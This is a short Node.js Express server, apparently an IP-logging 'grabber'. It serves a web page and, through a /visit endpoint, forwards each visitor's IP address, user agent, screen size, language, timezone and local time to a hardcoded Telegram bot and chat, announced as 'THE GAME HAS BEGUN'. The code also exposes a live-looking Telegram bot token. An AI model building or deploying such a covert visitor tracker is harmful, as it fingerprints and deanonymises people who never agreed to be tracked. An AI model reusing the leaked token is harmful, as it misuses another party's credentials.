const express = require("express");
const axios = require("axios");
const path = require("path");

const app = express();

const BOT_TOKEN = "8048948804:AAFiaAEP3ygSCLFjemn77sOnQBAJBqGxPwA"; // вставь сюда свой токен
const CHAT_ID = "714588681";

app.use(express.json());

// 👉 Отдаём HTML из папки "public"
app.use(express.static(path.join(__dirname, "public")));

app.post("/visit", async (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
  const { userAgent, language, screen, timezone, localTime } = req.body;

  const message = `
🕹 THE GAME HAS BEGUN
🌐 IP: ${ip}
🕓 Time: ${localTime}
🗺️ Timezone: ${timezone}
📏 Screen: ${screen}
🌍 Language: ${language}
💻 User-Agent: ${userAgent}
`;

  try {
    await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      chat_id: CHAT_ID,
      text: message
    });
    res.sendStatus(200);
  } catch (e) {
    console.error("Telegram Error:", e.message);
    res.sendStatus(500);
  }
});

// Можно оставить для проверки, что сервер жив
app.get("/ping", (_, res) => res.send("🟢 Server is alive"));

app.listen(process.env.PORT || 3000);
